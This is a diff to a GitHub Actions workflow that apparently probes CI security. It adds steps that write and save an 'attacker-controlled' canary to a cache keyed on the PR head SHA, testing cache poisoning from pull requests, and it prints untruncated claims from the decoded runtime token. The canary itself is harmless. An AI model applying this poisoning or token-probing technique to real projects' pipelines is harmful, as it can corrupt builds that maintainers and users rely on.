@@ -11,6 +11,8 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
+
       - name: Show context
         shell: bash
         run: |
@@ -19,14 +21,44 @@ jobs:
           echo "REF=$GITHUB_REF"
           echo "REPOSITORY=$GITHUB_REPOSITORY"
           echo "ACTOR=$GITHUB_ACTOR"
+          echo "PR_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
+          echo "PR_BASE_SHA=${{ github.event.pull_request.base.sha }}"
 
-      - name: actions/cache restore smoke
-        uses: actions/cache@v4
+      - name: Define poison key/canary
+        id: poison
+        shell: bash
+        run: |
+          set -euo pipefail
+          key="ab-poison-${{ github.event.pull_request.head.sha }}"
+          canary="poison-${{ github.event.pull_request.head.sha }}"
+          echo "key=$key" | tee -a "$GITHUB_OUTPUT"
+          echo "canary=$canary" | tee -a "$GITHUB_OUTPUT"
+          echo "POISON_KEY=$key"
+          echo "POISON_CANARY=$canary"
+
+      - name: Restore poison cache (should miss on first run)
+        id: restore
+        uses: actions/cache/restore@v4
         with:
-          path: .
-          key: ab-fork-cache-smoke
+          path: poison_cache
+          key: ${{ steps.poison.outputs.key }}
 
-      - name: ACTIONS_* presence
+      - name: Write attacker-controlled cache contents
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p poison_cache
+          printf '%s\n' "${{ steps.poison.outputs.canary }}" > poison_cache/poison.txt
+          ls -la poison_cache
+          echo "poison_txt=$(cat poison_cache/poison.txt)"
+
+      - name: Save poison cache
+        uses: actions/cache/save@v4
+        with:
+          path: poison_cache
+          key: ${{ steps.poison.outputs.key }}
+
+      - name: ACTIONS_* presence (run step)
         shell: bash
         run: |
           set -euo pipefail
@@ -59,8 +91,5 @@ jobs:
           payload = json.loads(base64.urlsafe_b64decode(pl.encode()))
           for k in ['repository_id','repository_visibility','run_id','job_id','ac','scp','trust_tier']:
               if k in payload:
-                  v = payload[k]
-                  if k == 'scp' and isinstance(v,str) and len(v) > 200:
-                      v = v[:200] + '...'
-                  print(f"{k}={v}")
+                  print(f"{k}={payload[k]}")
           PY
